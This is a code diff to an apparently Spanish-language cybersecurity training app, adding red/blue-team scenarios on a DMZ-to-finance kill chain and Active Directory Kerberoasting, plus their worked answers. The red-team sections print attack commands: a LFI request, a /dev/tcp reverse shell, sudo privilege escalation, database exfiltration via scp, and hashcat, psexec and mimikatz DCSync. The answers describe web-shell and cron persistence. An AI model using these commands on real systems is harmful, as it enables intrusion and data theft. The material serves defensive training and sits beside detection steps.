@@ -1,4 +1,5 @@
 
+
 import React from 'react';
 import type { TrainingScenario, ResourceModule, GlossaryTerm, TerminalLine, PromptState } from './types';
 
@@ -60,6 +61,9 @@ export const Icon: React.FC<IconProps> = ({ name, className, ...props }) => {
         'power-off': <><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></>,
         'user-check': <><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><polyline points="16 11 18 13 22 9"/></>,
         'shield': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></>,
+        'key': <><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></>,
+        // Fix: Replaced invalid SVG attribute 'y3' with 'y2' and 'y2' with 'x2' to correctly define the line elements.
+        'crosshair': <><circle cx="12" cy="12" r="10"/><line x1="22" y1="12" x2="18" y2="12"/><line x1="6" y1="12" x2="2" y2="12"/><line x1="12" y1="6" x2="12" y2="2"/><line x1="12" y1="22" x2="12" y2="18"/></>,
     };
 
     return (
@@ -370,6 +374,105 @@ wget http://malware-repo.bad/payload.sh</code></pre>
             </CisoCard>
         </>
     },
+    {
+        id: 'escenario9', icon: 'crosshair', color: 'bg-red-800', title: 'Escenario 9: La Cadena de Infección (Kill Chain)',
+        subtitle: 'Ataque multi-fase desde la DMZ hasta la red interna de finanzas.',
+        content: <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
+            <CisoCard icon="clipboard-list" title="Situación del Incidente">
+                <p>El SOC recibe alertas de bajo nivel sobre escaneos en el servidor 'WEB-DMZ-01'. Este servidor tiene una interfaz pública (eth0) y una interfaz interna (eth1) que conecta a la red '10.10.0.0/24', donde reside el servidor 'DB-FINANCE-01' (10.10.0.50).</p>
+                <p>Host Defensor (Azul): <code>ssh blue-team@WEB-DMZ-01</code></p>
+                <p>Host Atacante (Rojo): <code>pasante-red@soc-valtorix</code></p>
+            </CisoCard>
+            <CisoCard icon="shield" title="MISIÓN EQUIPO AZUL: Detección en Profundidad y Contención">
+                <p>Estás en una cacería de amenazas (Threat Hunt). El atacante intentará ser sigiloso. Debes correlacionar eventos de diferentes fuentes para descubrir el ataque completo.</p>
+                <h4>Objetivo 1: Detección de Explotación Web (Logs)</h4>
+                <p>Monitorea los logs del servidor web en tiempo real.</p>
+                <pre><code>tail -f /var/log/nginx/access.log{"\n"}grep \"../../\" /var/log/nginx/access.log</code></pre>
+                <h4>Objetivo 2: Detección de Acceso (Procesos y Red)</h4>
+                <p>Una vez que el atacante está dentro, sus comandos crearán ruido. Búscalos.</p>
+                <pre><code>ps aux | grep \"www-data\"{"\n"}netstat -anp | grep \"ESTABLISHED\"</code></pre>
+                <h4>Objetivo 3: Detección de Pivoteo (Red Interna)</h4>
+                <p>La peor pesadilla: el atacante usa tu servidor para atacar otros. Revisa la interfaz interna.</p>
+                <pre><code>tcpdump -i eth1 -n 'not arp and not port 22'{"\n"}ifconfig</code></pre>
+                <h4>Objetivo 4: Contención y Erradicación</h4>
+                <p>Una vez detectado, debes aislar el servidor y eliminar la amenaza.</p>
+                <pre><code>sudo ufw deny from [IP_ATACANTE]{"\n"}kill -9 [PID_SHELL_INVERSA]{"\n"}sudo ifdown eth1</code></pre>
+            </CisoCard>
+            <CisoCard icon="sword" title="MISIÓN EQUIPO ROJO: Infiltración, Pivoteo y Exfiltración">
+                <p>Tu objetivo no es el servidor web, es solo la puerta de entrada. El premio real está en la red interna de finanzas.</p>
+                <h4>Fase 1: Reconocimiento y Explotación Web</h4>
+                <p>Encuentra una vulnerabilidad en 'WEB-DMZ-01'.</p>
+                <pre><code>nmap -sV -p- WEB-DMZ-01{"\n"}dirb http://WEB-DMZ-01{"\n"}curl \"http://WEB-DMZ-01/view.php?file=../../../../etc/passwd\"</code></pre>
+                <h4>Fase 2: Acceso Inicial y Escalada</h4>
+                <p>La explotación web (simulada) te da ejecución de comandos como 'www-data'. Obtén una shell estable. (Simula una vulnerabilidad de 'sudo' mal configurada).</p>
+                <pre><code># En tu máquina (Listener):{"\n"}nc -lvnp 4444{"\n\n"}# En la víctima (via exploit web simulado):{"\n"}bash -c 'bash -i >& /dev/tcp/[TU_IP]/4444 0>&1'{"\n\n"}# Ya dentro de la shell inversa (como www-data):{"\n"}python3 -c 'import pty; pty.spawn(\"/bin/bash\")' # Estabilizar Shell{"\n"}sudo -l{"\n"}sudo /usr/bin/find . -exec /bin/sh \\; -quit # Escalada de privilegios</code></pre>
+                <h4>Fase 3: Pivoteo y Exfiltración de Datos</h4>
+                <p>Ahora eres 'root' en 'WEB-DMZ-01'. Usa el servidor como plataforma de salto.</p>
+                <pre><code>ifconfig # Descubrir la red interna en eth1{"\n"}nmap -sT 10.10.0.0/24 # Escanear la red interna (Pivoteo){"\n\n"}# Objetivo encontrado: 10.10.0.50{"\n"}ssh root@10.10.0.50 \"cat /db/finance_backup.sql\" > backup.sql{"\n\n"}# Exfiltración (sacar los datos){"\n"}tar -czf loot.tar.gz backup.sql{"\n"}scp loot.tar.gz pasante-red@soc-valtorix:~</code></pre>
+            </CisoCard>
+            <CisoCard icon="brain-circuit" title="Puntos de Pensamiento Crítico">
+                <ul>
+                    <li><b>Para Equipo Azul:</b> Detectas al Equipo Rojo escaneando la red interna (Pivoteo). ¿Cuál es tu acción de contención MÁS URGENTE: (A) Bloquear la IP pública del atacante en el firewall, (B) Matar el proceso de la shell inversa, o (C) Desactivar la interfaz de red interna (eth1)? Justifica tu priorización.</li>
+                    <li><b>Para Equipo Rojo:</b> El Equipo Azul te detecta y mata tu shell inversa. Sin embargo, no han parchado la vulnerabilidad web. ¿Cómo mantendrías la persistencia en el servidor de una forma más sigilosa que una shell inversa activa?</li>
+                    <li><b>Para Ambos Equipos:</b> El Equipo Azul ha contenido la amenaza (IP bloqueada, shell muerta, eth1 abajo). El incidente no ha terminado. ¿Cuáles son los siguientes pasos del Equipo Azul (Erradicación y Recuperación) y qué evidencia debería buscar para confirmar que el Equipo Rojo no dejó 'regalos' (backdoors, cronjobs, etc.)?</li>
+                </ul>
+            </CisoCard>
+        </div>
+    },
+    {
+        id: 'escenario10',
+        icon: 'key',
+        color: 'bg-yellow-600',
+        title: 'Escenario 10: La Escalada del Dominio (Active Directory)',
+        subtitle: "Ataque de Kerberoasting y Movimiento Lateral en el dominio 'cybervaltorix.local'.",
+        content: <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
+            <CisoCard icon="clipboard-list" title="Situación del Incidente">
+                <p>El Equipo Rojo ha comprometido una estación de trabajo ('WKSTN-07') con un usuario de dominio de bajos privilegios ('pasante-red'). Su objetivo es escalar privilegios hasta Administrador de Dominio para acceder al servidor de bases de datos 'DB-FINANCE-01'. El Equipo Azul monitorea el Controlador de Dominio ('DC-01').</p>
+                <p>Host Defensor (Azul): <code>ssh admin-blue@DC-01</code></p>
+                <p>Host Atacante (Rojo): <code>ssh pasante-red@WKSTN-07</code></p>
+            </CisoCard>
+            <CisoCard icon="shield" title="MISIÓN EQUIPO AZUL: Caza de Amenazas en AD">
+                <p>Estás monitoreando los logs de seguridad de 'DC-01'. Un atacante en la red es mucho más peligroso que uno externo. Debes detectar la enumeración y el abuso de protocolos.</p>
+                <h4>Objetivo 1: Monitoreo de Eventos en Vivo</h4>
+                <p>Establece tu línea base. Los eventos de Kerberos y autenticación son tu fuente de verdad.</p>
+                <pre><code>tail -f /var/log/ad-security.log</code></pre>
+                <h4>Objetivo 2: Detección de Enumeración</h4>
+                <p>El atacante primero buscará objetivos. Esto genera ruido de 'consultas' en los logs.</p>
+                <pre><code># (Simulación) Buscar logs de enumeración de usuarios/grupos{"\n"}grep "EventID=4798" /var/log/ad-security.log</code></pre>
+                <h4>Objetivo 3: Detección de Kerberoasting</h4>
+                <p>El ataque principal. El atacante solicitará tickets de servicio (TGS) para cuentas con SPN. Busca solicitudes de tickets con cifrado débil (RC4) o para cuentas de servicio inusuales.</p>
+                <pre><code># (Simulación) Buscar eventos de solicitud TGS (4769) sospechosos{"\n"}grep "EventID=4769" /var/log/ad-security.log | grep "svc_sql"</code></pre>
+                <h4>Objetivo 4: Contención y Remediación</h4>
+                <p>Una vez identificada la cuenta abusada, debes neutralizarla INMEDIATAMENTE.</p>
+                <pre><code># (Simulación) Deshabilitar cuenta en AD{"\n"}disable-ad-user -user svc_sql{"\n\n"}# (Simulación) Forzar reseteo de contraseña (más de 16 caracteres){"\n"}reset-ad-password -user svc_sql -force{"\n\n"}# Bloquear la estación de trabajo comprometida{"\n"}sudo ufw deny from [IP_WKSTN-07]</code></pre>
+            </CisoCard>
+            <CisoCard icon="sword" title="MISIÓN EQUIPO ROJO: De Pasante a Administrador de Dominio">
+                <p>Estás dentro de la red. Es hora de cazar credenciales y moverte lateralmente.</p>
+                <h4>Fase 1: Enumeración de Dominio (BloodHound)</h4>
+                <p>Mapea el dominio para encontrar tu camino al 'Domain Admin'.</p>
+                <pre><code># (Simulación) Ejecutar colector de BloodHound{"\n"}bloodhound-cli -d cybervaltorix.local -c all</code></pre>
+                <h4>Fase 2: Identificar Objetivos (Kerberoasting)</h4>
+                <p>Tu BloodHound (simulado) revela una cuenta de servicio 'svc_sql' con un SPN. Esta es un objetivo perfecto para Kerberoasting.</p>
+                <pre><code># (Simulación) Solicitar un TGS para la cuenta de servicio{"\n"}GetUserSPNs.py -dc-ip 10.10.0.5 -request -user svc_sql</code></pre>
+                <h4>Fase 3: Cracking Offline (Hashcat)</h4>
+                <p>El TGS contiene un hash de la contraseña del usuario. Craquéalo offline.</p>
+                <pre><code># (Simulación) Usar Hashcat para romper el hash TGS (Modo 13100){"\n"}hashcat -m 13100 svc_sql.hash /usr/share/wordlists/rockyou.txt</code></pre>
+                <h4>Fase 4: Movimiento Lateral (psexec)</h4>
+                <p>¡Éxito! La contraseña era 'SqlP@ssw0rd123'. Tu BloodHound te dijo que 'svc_sql' es Admin Local en 'DC-01'. Usa esto para escalar.</p>
+                <pre><code># (Simulación) Usar psexec (o similar) para obtener una shell como svc_sql en DC-01{"\n"}psexec.py svc_sql@DC-01 cmd.exe</code></pre>
+                <h4>Fase 5: Dominio Total (DCSync)</h4>
+                <p>Ahora eres admin en el DC. Exfiltra todos los hashes del dominio.</p>
+                <pre><code># (Simulación) Ejecutar Mimikatz o similar para DCSync{"\n"}mimikatz.exe "lsadump::dcsync /domain:cybervaltorix.local /all"</code></pre>
+            </CisoCard>
+            <CisoCard icon="brain-circuit" title="Puntos de Pensamiento Crítico">
+                <ul>
+                    <li><b>Para Equipo Azul:</b> Detectas el Kerberoasting (Fase 3 del Rojo). ¿Cuál es tu prioridad MÁS ALTA: (A) Deshabilitar la cuenta 'svc_sql', (B) Bloquear la IP de 'WKSTN-07', o (C) Forzar un reseteo de contraseña para 'svc_sql'? Justifica tu elección.</li>
+                    <li><b>Para Equipo Rojo:</b> El Equipo Azul te detecta y resetea la contraseña de 'svc_sql'. Tu ataque de Kerberoasting falló. Sin embargo, tu enumeración de BloodHound (Fase 1) sigue siendo válida. ¿Cuál sería tu siguiente vector de ataque? (Ej. Buscar otro SPN, buscar contraseñas en GPO, etc.)</li>
+                    <li><b>Para Ambos Equipos:</b> El ataque tuvo éxito porque la cuenta de servicio 'svc_sql' tenía (1) una contraseña débil y (2) privilegios excesivos (Admin en el DC). ¿Cuál es la solución de Active Directory moderna y a largo plazo para prevenir el Kerberoasting de cuentas de servicio? (Pista: gMSA - group Managed Service Accounts).</li>
+                </ul>
+            </CisoCard>
+        </div>
+    },
 ];
 
 export const RESOURCE_MODULES: ResourceModule[] = [
@@ -511,6 +614,100 @@ export const RESOURCE_MODULES: ResourceModule[] = [
                     <dd>La estrategia aquí es usar un ataque "ruidoso" y de baja complejidad (DoS) como una cortina de humo para ocultar el ataque más sigiloso y peligroso (fuerza bruta para obtener credenciales). Mientras el equipo de defensa está ocupado con el DoS, el atacante intenta ganar acceso.</dd>
                     <dt>Inundación SYN (hping3):</dt>
                     <dd><code>hping3 --flood -S [host]</code> envía una ráfaga de paquetes TCP SYN sin completar el handshake. Es una forma clásica y efectiva de probar la resistencia de un servidor a ataques DoS a nivel de red.</dd>
+                </dl>
+            </CisoCard>
+        </>
+    },
+    {
+        id: 'recurso-taller9', icon: 'brain-circuit', title: 'Análisis Profundo: La Cadena de Infección (Taller 9)',
+        content: <>
+            <CisoCard icon="shield" title="Resolución: Prioridad de Contención (Equipo Azul)">
+                 <p><strong>Pregunta:</strong> Detectas al Equipo Rojo escaneando la red interna. ¿Cuál es la acción de contención MÁS URGENTE?</p>
+                 <p><strong>Respuesta Estratégica: (C) Desactivar la interfaz de red interna (eth1).</strong></p>
+                 <dl>
+                    <dt>Justificación:</dt>
+                    <dd>La amenaza inmediata y más peligrosa es el <strong>movimiento lateral</strong> hacia la red interna de finanzas. El servidor DMZ ya está comprometido; el objetivo ahora es proteger los activos de mayor valor.
+                        <ul>
+                            <li><strong>(A) Bloquear la IP pública:</strong> Es correcto, pero no detiene un escaneo interno ya iniciado.</li>
+                            <li><strong>(B) Matar la shell:</strong> Es necesario, pero el atacante podría tener otros procesos o persistencia.</li>
+                            <li><strong>(C) Desactivar eth1:</strong> Corta de raíz la capacidad del atacante para pivotear. Es la acción que contiene el "radio de explosión" del incidente de forma inmediata.</li>
+                        </ul>
+                    </dd>
+                </dl>
+            </CisoCard>
+            <CisoCard icon="sword" title="Resolución: Persistencia Sigilosa (Equipo Rojo)">
+                <p><strong>Pregunta:</strong> El Equipo Azul mata tu shell. ¿Cómo mantienes la persistencia de forma sigilosa?</p>
+                <p><strong>Respuesta Estratégica: Usar un Web Shell o un Cron Job.</strong></p>
+                <dl>
+                    <dt>Web Shell:</dt>
+                    <dd>Es la opción más sigilosa. Se sube un archivo (ej. <code>shell.php</code>) al directorio web. Es pasivo, no genera tráfico de red y se activa solo cuando el atacante lo visita en un navegador, mezclándose con el tráfico HTTP/S normal. Es muy difícil de detectar solo con monitoreo de red.</dd>
+                    <dt>Cron Job:</dt>
+                    <dd>Se puede configurar una tarea programada que intente establecer una shell inversa hacia el atacante cada minuto. Es más ruidoso que un web shell (genera tráfico de red constante), pero es más resistente que una shell interactiva única.</dd>
+                </dl>
+            </CisoCard>
+            <CisoCard icon="refresh-cw" title="Resolución: Siguientes Pasos (Erradicación y Recuperación)">
+                <p><strong>Pregunta:</strong> La amenaza está contenida. ¿Ahora qué?</p>
+                <p><strong>Respuesta Estratégica: El incidente NO ha terminado.</strong></p>
+                 <dl>
+                    <dt>Pasos del Equipo Azul:</dt>
+                    <dd>
+                        <ol>
+                            <li><strong>Análisis Forense:</strong> Tomar una instantánea (snapshot) del servidor comprometido para analizarla offline sin destruir evidencia.</li>
+                            <li><strong>Identificar y Parchear:</strong> Encontrar la vulnerabilidad raíz (el LFI en <code>view.php</code>) y corregirla.</li>
+                            <li><strong>Erradicar Persistencia:</strong> Cazar "regalos" del atacante. La evidencia a buscar incluye:
+                                <ul>
+                                    <li>Archivos sospechosos en directorios web (<code>/var/www/html</code>).</li>
+                                    <li>Tareas programadas para el usuario <code>www-data</code> (<code>crontab -l -u www-data</code>).</li>
+                                    <li>Reglas de <code>sudo</code> inusuales (<code>/etc/sudoers</code>).</li>
+                                </ul>
+                            </li>
+                            <li><strong>Recuperación Segura:</strong> La mejor práctica es <strong>no</strong> limpiar el servidor. Se debe reconstruir desde una plantilla limpia y restaurar los datos desde un respaldo seguro (previo al incidente).</li>
+                            <li><strong>Lecciones Aprendidas:</strong> Documentar el incidente. Implementar monitoreo mejorado (ej. alertas si un proceso web inicia una conexión de red saliente).</li>
+                        </ol>
+                    </dd>
+                </dl>
+            </CisoCard>
+        </>
+    },
+    {
+        id: 'recurso-taller10',
+        icon: 'key',
+        title: 'Análisis Profundo: Escalada de Dominio (Taller 10)',
+        content: <>
+            <CisoCard icon="shield" title="Resolución: Prioridad de Contención (Equipo Azul)">
+                 <p><strong>Pregunta:</strong> Detectas el Kerberoasting. ¿Cuál es tu prioridad MÁS ALTA?</p>
+                 <p><strong>Respuesta Estratégica: (A) Deshabilitar la cuenta 'svc_sql'.</strong></p>
+                 <dl>
+                    <dt>Justificación:</dt>
+                    <dd>El atacante ya tiene el hash del ticket (TGS). Cambiar la contraseña no invalida el ticket existente. Bloquear la IP no impide que el atacante use el hash en otra máquina si tiene la capacidad. Deshabilitar la cuenta es la única acción que invalida inmediatamente cualquier intento de autenticación con ese ticket, cortando el acceso del atacante de raíz.</dd>
+                </dl>
+            </CisoCard>
+            <CisoCard icon="sword" title="Resolución: Pivote Táctico (Equipo Rojo)">
+                <p><strong>Pregunta:</strong> Tu objetivo principal fue bloqueado. ¿Ahora qué?</p>
+                <p><strong>Respuesta Estratégica: Continuar con la enumeración y buscar otras debilidades.</strong></p>
+                <dl>
+                    <dt>Siguientes Vectores:</dt>
+                    <dd>Un buen pentester nunca depende de un solo vector. Las opciones incluyen:
+                        <ul>
+                            <li><strong>AS-REP Roasting:</strong> Buscar usuarios que no requieren pre-autenticación de Kerberos.</li>
+                            <li><strong>Búsqueda en GPO:</strong> Buscar archivos de preferencias de directivas de grupo que puedan contener contraseñas codificadas.</li>
+                            <li><strong>Escalada de Privilegios Local:</strong> Buscar vulnerabilidades en 'WKSTN-07' para escalar a 'SYSTEM' local y extraer otros hashes de la memoria (LSASS).</li>
+                        </ul>
+                    </dd>
+                </dl>
+            </CisoCard>
+            <CisoCard icon="shield-check" title="Resolución: Mitigación a Largo Plazo (Ambos Equipos)">
+                <p><strong>Pregunta:</strong> ¿Cuál es la solución moderna para proteger cuentas de servicio?</p>
+                <p><strong>Respuesta Estratégica: Cuentas de Servicio Administradas por Grupo (gMSA).</strong></p>
+                 <dl>
+                    <dt>¿Por qué gMSA?:</dt>
+                    <dd>
+                        <ol>
+                            <li><strong>Contraseñas Seguras y Rotativas:</strong> Active Directory gestiona y rota automáticamente contraseñas complejas de 240 caracteres para estas cuentas, haciendo el cracking offline prácticamente imposible.</li>
+                            <li><strong>Sin Gestión Manual:</strong> Los administradores no conocen ni necesitan gestionar las contraseñas, eliminando el riesgo de contraseñas débiles o reutilizadas.</li>
+                            <li><strong>Identidad Administrada:</strong> La cuenta está ligada a un grupo de seguridad de computadoras, limitando qué servidores pueden usarla.</li>
+                        </ol>
+                    </dd>
                 </dl>
             </CisoCard>
         </>
